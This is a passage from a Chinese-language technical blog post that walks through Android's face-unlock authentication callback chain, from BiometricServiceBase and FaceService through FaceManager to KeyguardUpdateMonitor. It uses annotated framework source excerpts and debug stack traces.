class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                currentClient.stop(initiatedByClient);</span><br><span class="line">                mHandler.removeCallbacks(mResetClientState);</span><br><span class="line">                mHandler.postDelayed(mResetClientState, CANCEL_TIMEOUT_LIMIT);</span><br><span class="line">            &#125;</span><br><span class="line">            mPendingClient = newClient;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (newClient != <span class="literal">null</span>) &#123;</span><br><span class="line">             <span class="comment">// 省略部分代码......</span></span><br><span class="line">            <span class="comment">// We are not a BiometricPrompt client, start the client immediately</span></span><br><span class="line">            mCurrentClient = newClient;</span><br><span class="line">            <span class="comment">/*重点关注*/</span></span><br><span class="line">            startCurrentClient(mCurrentClient.getCookie());</span><br><span class="line">            <span class="comment">//这里继续将AuthenticationClient传递进去</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">startCurrentClient</span><span class="params">(<span class="type">int</span> cookie)</span> &#123;</span><br><span class="line">    </span><br><span class="line">         <span class="comment">// 省略部分代码......</span></span><br><span class="line">         <span class="comment">/*重点关注*/</span></span><br><span class="line">         <span class="comment">//这里调用的是AuthenticationClient的start方法</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">status</span> <span class="operator">=</span> mCurrentClient.start();</span><br><span class="line">        <span class="keyword">if</span> (status == <span class="number">0</span>) &#123;</span><br><span class="line">            notifyClientActiveCallbacks(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">// ... ...</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>mCurrentClient是ClientMonitor的对象，而AuthenticationClient继承了ClientMonitor类；<br>AuthenticationClient#start()<br><strong>frameworks/base/services/core/java/com/android/server/biometrics/sensors/AuthenticationClient.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 开始验证</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">        mStarted = <span class="literal">true</span>;</span><br><span class="line">        onStart();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/*重点关注*/</span></span><br><span class="line">            <span class="comment">// 获取 DaemonWrappe 对象开始鉴权，这里如果鉴权完成会回调注册的 ClientMonito r的 onAuthenticated 接口</span></span><br><span class="line">            <span class="comment">//到这一步 DaemonWrappe 对象 进入等待捕获人脸信息，摄像头会给到DaemonWrappe对象人脸信息。</span></span><br><span class="line">            <span class="comment">// 这里对调用到 DaemonWrapper 在 FaceService 里有实现，在那里会直接调用到 HAL 层</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> getDaemonWrapper().authenticate(mOpId, getGroupId());</span><br><span class="line">            <span class="keyword">if</span> (result != <span class="number">0</span>) &#123;</span><br><span class="line">                Slog.w(getLogTag(), <span class="string">&quot;startAuthentication failed, result=&quot;</span> + result);</span><br><span class="line">                mMetricsLogger.histogram(mConstants.tagAuthStartError(), result);</span><br><span class="line">                onError(getHalDeviceId(), BiometricConstants.BIOMETRIC_ERROR_HW_UNAVAILABLE,</span><br><span class="line">                        <span class="number">0</span> <span class="comment">/* vendorCode */</span>);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (DEBUG) Slog.w(getLogTag(), <span class="string">&quot;client &quot;</span> + getOwnerString() + <span class="string">&quot; is authenticating...&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            Slog.e(getLogTag(), <span class="string">&quot;startAuthentication failed&quot;</span>, e);</span><br><span class="line">            <span class="keyword">return</span> ERROR_ESRCH;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// success</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>start方法会调用faced，调用底层的人脸库，底层库返回结果后会调用onAuthenticated来反馈结果给receiver，在往上层反馈。<br>补充：IExtBiometricsFace.hal 这个接口在 ExtBiometricsFace.cpp中实现。<br><strong>frameworks/base/services/core/java/com/android/server/biometrics/face/FaceService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onStart</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onStart();</span><br><span class="line">    <span class="comment">// 在初始化后会建立和HAL层的通信，即连接到 FaceService，</span></span><br><span class="line">    <span class="comment">//并通过getFaceDaemon()拿到用于通信的 IExtBiometricsFace对象（binder）</span></span><br><span class="line">    publishBinderService(Context.FACE_SERVICE, <span class="keyword">new</span> <span class="title class_">FaceServiceWrapper</span>());</span><br><span class="line"> </span><br><span class="line">    SystemServerInitThreadPool.submit(() -&gt; mHandler.post(<span class="built_in">this</span>::getFaceDaemon),</span><br><span class="line">            TAG + <span class="string">&quot;.onStart&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="屏幕解锁（结果回调、移除锁）"><a href="#屏幕解锁（结果回调、移除锁）" class="headerlink" title="屏幕解锁（结果回调、移除锁）"></a>屏幕解锁（结果回调、移除锁）</h3><p>底层库回调onAuthenticated堆栈:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">12-10 16:33:49.998  1017  1017 D longzhiye  : longzhiye：FaceService.java ServiceListenerImpl onAuthenticationSucceeded()</span><br><span class="line">12-10 16:33:49.998  1017  1017 D longzhiye  : java.lang.Throwable</span><br><span class="line">12-10 16:33:49.998  1017  1017 D longzhiye  :      at com.android.server.biometrics.face.FaceService$ServiceListenerImpl.onAuthenticationSucceeded(FaceService.java:918)</span><br><span class="line">12-10 16:33:49.998  1017  1017 D longzhiye  :      at com.android.server.biometrics.AuthenticationClient.onAuthenticated(AuthenticationClient.java:235)</span><br><span class="line">12-10 16:33:49.998  1017  1017 D longzhiye  :      at com.android.server.biometrics.face.FaceService$FaceAuthClient.onAuthenticated(FaceService.java:297)</span><br><span class="line">12-10 16:33:49.998  1017  1017 D longzhiye  :      at com.android.server.biometrics.BiometricServiceBase.handleAuthenticated(BiometricServiceBase.java:729)</span><br><span class="line">12-10 16:33:49.998  1017  1017 D longzhiye  :      at com.android.server.biometrics.face.FaceService.access$11801(FaceService.java:110)</span><br><span class="line">12-10 16:33:49.998  1017  1017 D longzhiye  :      at com.android.server.biometrics.face.FaceService$1.lambda$onAuthenticated$2$FaceService$1(FaceService.java:1040)</span><br><span class="line">12-10 16:33:49.998  1017  1017 D longzhiye  :      at com.android.server.biometrics.face.-$$Lambda$FaceService$1$GcU4ZG1fdDLhKvSxuMwfPargEnI.run(Unknown Source:8)</span><br><span class="line">12-10 16:33:49.998  1017  1017 D longzhiye  :      at android.os.Handler.handleCallback(Handler.java:938)</span><br><span class="line">12-10 16:33:49.998  1017  1017 D longzhiye  :      at android.os.Handler.dispatchMessage(Handler.java:99)</span><br><span class="line">12-10 16:33:49.998  1017  1017 D longzhiye  :      at android.os.Looper.loop(Looper.java:223)</span><br><span class="line">12-10 16:33:49.998  1017  1017 D longzhiye  :      at com.android.server.SystemServer.run(SystemServer.java:647)</span><br><span class="line">12-10 16:33:49.998  1017  1017 D longzhiye  :      at com.android.server.SystemServer.main(SystemServer.java:431)</span><br><span class="line">12-10 16:33:49.998  1017  1017 D longzhiye  :      at java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">12-10 16:33:49.998  1017  1017 D longzhiye  :      at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:603)</span><br><span class="line">12-10 16:33:49.998  1017  1017 D longzhiye  :      at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:925)</span><br></pre></td></tr></table></figure><p>根据前面的讲的 底层 Face HIDL 可以知道 IExtBiometricsFaceClientCallback 是回调人脸识别结果的。onAuthenticated()是当一张人脸被成功认证时被回调。<br><strong>frameworks/base/services/core/java/com/android/server/biometrics/face/FaceService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Receives callbacks from the HAL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">IExtBiometricsFaceClientCallback</span> <span class="variable">mDaemonCallback</span> <span class="operator">=</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">IExtBiometricsFaceClientCallback</span>.Stub() &#123;</span><br><span class="line">   </span><br><span class="line">     <span class="comment">// 省略部分代码 ......</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAuthenticated</span><span class="params">(<span class="keyword">final</span> <span class="type">long</span> deviceId, <span class="keyword">final</span> <span class="type">int</span> faceId, <span class="keyword">final</span> <span class="type">int</span> userId,</span></span><br><span class="line"><span class="params">            ArrayList&lt;Byte&gt; token)</span> &#123;</span><br><span class="line">        mHandler.post(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Face</span> <span class="variable">face</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Face</span>(<span class="string">&quot;&quot;</span>, faceId, deviceId);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">authenticated</span> <span class="operator">=</span> faceId != <span class="number">0</span>;</span><br><span class="line">            <span class="comment">/*重点在这里*/</span></span><br><span class="line">            FaceService.<span class="built_in">super</span>.handleAuthenticated(authenticated, face, token);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">// 省略部分代码 ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>通过上面 FaceService.super.handleAuthenticated(authenticated, face, token) 的调用。将会调用到：<br>BiometricServiceBase#handleAuthenticated()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BiometricServiceBase.java</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">handleAuthenticated</span><span class="params">(<span class="type">boolean</span> authenticated,</span></span><br><span class="line"><span class="params">            BiometricAuthenticator.Identifier identifier, ArrayList&lt;Byte&gt; token)</span> &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;longzhiye&quot;</span>,<span class="string">&quot;longzhiye：AuthenticationClient.java ----------------2 &quot;</span>);</span><br><span class="line">        <span class="type">ClientMonitor</span> <span class="variable">client</span> <span class="operator">=</span> mCurrentClient;</span><br><span class="line">        <span class="comment">// 重点在后半句判断，通过前面的分析可以知道 client 其实是 FaceAuthClient 的对象</span></span><br><span class="line">        <span class="keyword">if</span> (client != <span class="literal">null</span> &amp;&amp; client.onAuthenticated(identifier, authenticated, token)) &#123;</span><br><span class="line">            removeClient(client);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (authenticated) &#123;</span><br><span class="line">            mPerformanceStats.accept++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            mPerformanceStats.reject++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过前面的分析可以知道 client 其实是 FaceAuthClient 的对象，在FaceService.java 的内部类FaceServiceWrapper的authenticate()方法进行实例化传过去的。反正最终将会回调到FaceService.java 的内部类FaceAuthClient的onAuthenticated()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onAuthenticated</span><span class="params">(BiometricAuthenticator.Identifier identifier,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> authenticated, ArrayList&lt;Byte&gt; token)</span> &#123;</span><br><span class="line">    Log.d(<span class="string">&quot;longzhiye&quot;</span>,<span class="string">&quot;longzhiye onAuthenticated &quot;</span>,<span class="keyword">new</span> <span class="title class_">Throwable</span>());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重点关注super</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">super</span>.onAuthenticated(identifier, authenticated, token);</span><br><span class="line"></span><br><span class="line">    mUsageStats.addEvent(<span class="keyword">new</span> <span class="title class_">AuthenticationEvent</span>(</span><br><span class="line">            getStartTimeMs(),</span><br><span class="line">            System.currentTimeMillis() - getStartTimeMs() <span class="comment">/* latency */</span>,</span><br><span class="line">            authenticated,</span><br><span class="line">            <span class="number">0</span> <span class="comment">/* error */</span>,</span><br><span class="line">            <span class="number">0</span> <span class="comment">/* vendorError */</span>,</span><br><span class="line">            getTargetUserId()));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// For face, the authentication lifecycle ends either when</span></span><br><span class="line">    <span class="comment">// 1) Authenticated == true</span></span><br><span class="line">    <span class="comment">// 2) Error occurred</span></span><br><span class="line">    <span class="comment">// 3) Authenticated == false</span></span><br><span class="line">    <span class="comment">// Fingerprint currently does not end when the third condition is met which is a bug,</span></span><br><span class="line">    <span class="comment">// but let&#x27;s leave it as-is for now.</span></span><br><span class="line">    <span class="keyword">return</span> result || !authenticated;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的super将会调到父类AuthenticationClient中的onAuthenticated()。<br>AuthenticationClient#onAuthenticated()<br><strong>frameworks/base/services/core/java/com/android/server/biometrics/sensors/AuthenticationClient.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onAuthenticated</span><span class="params">(BiometricAuthenticator.Identifier identifier,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> authenticated, ArrayList&lt;Byte&gt; token)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.logOnAuthenticated(getContext(), authenticated, mRequireConfirmation,</span><br><span class="line">            getTargetUserId(), isBiometricPrompt());</span><br><span class="line">      <span class="comment">// 省略部分代码 ......</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG) Slog.v(getLogTag(), <span class="string">&quot;onAuthenticated(&quot;</span> + authenticated + <span class="string">&quot;)&quot;</span></span><br><span class="line">                + <span class="string">&quot;, ID:&quot;</span> + identifier.getBiometricId()</span><br><span class="line">                + <span class="string">&quot;, Owner: &quot;</span> + getOwnerString()</span><br><span class="line">                + <span class="string">&quot;, isBP: &quot;</span> + isBiometricPrompt()</span><br><span class="line">                + <span class="string">&quot;, listener: &quot;</span> + listener</span><br><span class="line">                + <span class="string">&quot;, requireConfirmation: &quot;</span> + mRequireConfirmation</span><br><span class="line">                + <span class="string">&quot;, user: &quot;</span> + getTargetUserId());</span><br><span class="line">        <span class="keyword">if</span> (authenticated) &#123; </span><br><span class="line">          <span class="comment">// 省略部分代码 ......</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// Explicitly have if/else here to make it super obvious in case the code is</span></span><br><span class="line">                    <span class="comment">// touched in the future.</span></span><br><span class="line">                    <span class="keyword">if</span> (!getIsRestricted()) &#123;</span><br><span class="line">                        <span class="comment">/*重点关注*/</span> </span><br><span class="line">                        <span class="comment">// getIsRestricted() 获取有没有权限登录，说白了就是验证是否成功</span></span><br><span class="line">                        listener.onAuthenticationSucceeded(</span><br><span class="line">                                getHalDeviceId(), identifier, getTargetUserId());</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        listener.onAuthenticationSucceeded(</span><br><span class="line">                                getHalDeviceId(), <span class="literal">null</span>, getTargetUserId());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                    Slog.e(getLogTag(), <span class="string">&quot;Remote exception&quot;</span>, e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Client not listening</span></span><br><span class="line">                Slog.w(getLogTag(), <span class="string">&quot;Client not listening&quot;</span>);</span><br><span class="line">                result = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="comment">// 省略部分代码 ......</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        Slog.e(getLogTag(), <span class="string">&quot;Remote exception&quot;</span>, e);</span><br><span class="line">        result = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 listener 其实是 BiometricServiceBase.ServiceListener 接口的回调，BiometricServiceBase的内部类BiometricServiceListener也实现了该接口，但是没有实现onAuthenticationSucceeded() 方法，而该ServiceListener 接口在FaceService中的内部类ServiceListenerImpl 也有实现，并且实现了onAuthenticationSucceeded() 方法。所以将会回调到FaceService内部类的 ServiceListenerImpl#onAuthenticationSucceeded()。<br>ServiceListenerImpl#onAuthenticationSucceeded()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 从 ClientMonitor 实现接收回调。结果被转发到 FaceManager</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">ServiceListenerImpl</span> <span class="keyword">implements</span> <span class="title class_">ServiceListener</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> IFaceServiceReceiver mFaceServiceReceiver;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ServiceListenerImpl</span><span class="params">(IFaceServiceReceiver receiver)</span> &#123;</span><br><span class="line">            mFaceServiceReceiver = receiver;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="comment">// 省略部分代码 ......</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAuthenticationSucceeded</span><span class="params">(<span class="type">long</span> deviceId,</span></span><br><span class="line"><span class="params">                BiometricAuthenticator.Identifier biometric, <span class="type">int</span> userId)</span></span><br><span class="line">                <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="keyword">if</span> (mFaceServiceReceiver != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (biometric == <span class="literal">null</span> || biometric <span class="keyword">instanceof</span> Face) &#123;</span><br><span class="line">                    <span class="comment">// 重点关注这里</span></span><br><span class="line">                    mFaceServiceReceiver.onAuthenticationSucceeded(deviceId, (Face) biometric,</span><br><span class="line">                            userId, isStrongBiometric());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Slog.e(TAG, <span class="string">&quot;onAuthenticationSucceeded received non-face biometric&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="comment">// 省略部分代码 ......</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ServiceListenerImpl  这个类是负责将回调结果，转发到 FaceManager 中的。通过 IFaceServiceReceiver 的对象，回调 FaceManager 中的 onAuthenticationSucceeded() 方法。<br>FaceManager#onAuthenticationSucceeded()<br><strong>frameworks/base/core/java/android/hardware/face/FaceManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">IFaceServiceReceiver</span> <span class="variable">mServiceReceiver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IFaceServiceReceiver</span>.Stub() &#123;</span><br><span class="line">     <span class="comment">// 省略部分代码 ......</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// binder call</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAuthenticationSucceeded</span><span class="params">(<span class="type">long</span> deviceId, Face face, <span class="type">int</span> userId,</span></span><br><span class="line"><span class="params">            <span class="type">boolean</span> isStrongBiometric)</span> &#123;</span><br><span class="line">        mHandler.obtainMessage(MSG_AUTHENTICATION_SUCCEEDED, userId, isStrongBiometric ? <span class="number">1</span> : <span class="number">0</span>,</span><br><span class="line">                face).sendToTarget();</span><br><span class="line">        <span class="comment">//onFaceidStopped();</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">// 省略部分代码 ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这里通过 mHandler 发送了 MSG_AUTHENTICATION_SUCCEEDED 消息，在 handleMessage 中将会执行 sendAuthenticatedSucceeded() 方法。<br><strong>frameworks/base/core/java/android/hardware/face/FaceManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sendAuthenticatedSucceeded</span><span class="params">(Face face, <span class="type">int</span> userId, <span class="type">boolean</span> isStrongBiometric)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mAuthenticationCallback != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">AuthenticationResult</span> <span class="variable">result</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">AuthenticationResult</span>(mCryptoObject, face, userId, isStrongBiometric);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 主要关注这里</span></span><br><span class="line">        mAuthenticationCallback.onAuthenticationSucceeded(result); </span><br><span class="line">        mAuthenticationCallback = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(mPendingFaceAuth != <span class="literal">null</span>) &#123;</span><br><span class="line">            authenticateInternel(mPendingFaceAuth.mCrypto, mPendingFaceAuth.mCancel, mPendingFaceAuth.mFlags, mPendingFaceAuth.mCallback, mPendingFaceAuth.mHandler, mPendingFaceAuth.mUserId);</span><br><span class="line">            mPendingFaceAuth = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 sendAuthenticatedSucceeded() 方法中将会执行 BiometricAuthenticator.AuthenticationCallback 的接口的回调，将会把结果回调到 KeyguardUpdateMonitor 中FaceManager.AuthenticationCallback 的onAuthenticationSucceeded() 方法。<br>FaceManager.AuthenticationCallback#onAuthenticationSucceeded()<br>可以看一个堆栈图：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">12-10 16:33:50.024  1414  1414 D longzhiye  : java.lang.Throwable</span><br><span class="line">12-10 16:33:50.024  1414  1414 D longzhiye  :      at com.android.keyguard.KeyguardUpdateMonitor$15.onAuthenticationSucceeded(KeyguardUpdateMonitor.java:1427)</span><br><span class="line">12-10 16:33:50.024  1414  1414 D longzhiye  :      at android.hardware.face.FaceManager.sendAuthenticatedSucceeded(FaceManager.java:1212)</span><br><span class="line">12-10 16:33:50.024  1414  1414 D longzhiye  :      at android.hardware.face.FaceManager.access$1300(FaceManager.java:63)</span><br><span class="line">12-10 16:33:50.024  1414  1414 D longzhiye  :      at android.hardware.face.FaceManager$MyHandler.handleMessage(FaceManager.java:1120)</span><br><span class="line">12-10 16:33:50.024  1414  1414 D longzhiye  :      at android.os.Handler.dispatchMessage(Handler.java:106)</span><br><span class="line">12-10 16:33:50.024  1414  1414 D longzhiye  :      at android.os.Looper.loop(Looper.java:223)</span><br><span class="line">12-10 16:33:50.024  1414  1414 D longzhiye  :      at android.app.ActivityThread.main(ActivityThread.java:7945)</span><br><span class="line">12-10 16:33:50.024  1414  1414 D longzhiye  :      at java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">12-10 16:33:50.024  1414  1414 D longzhiye  :      at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:603)</span><br><span class="line">12-10 16:33:50.024  1414  1414 D longzhiye  :      at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:947)</span><br></pre></td></tr></table></figure><p><strong>frameworks/base/packages/SystemUI/src/com/android/keyguard/KeyguardUpdateMonitor.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 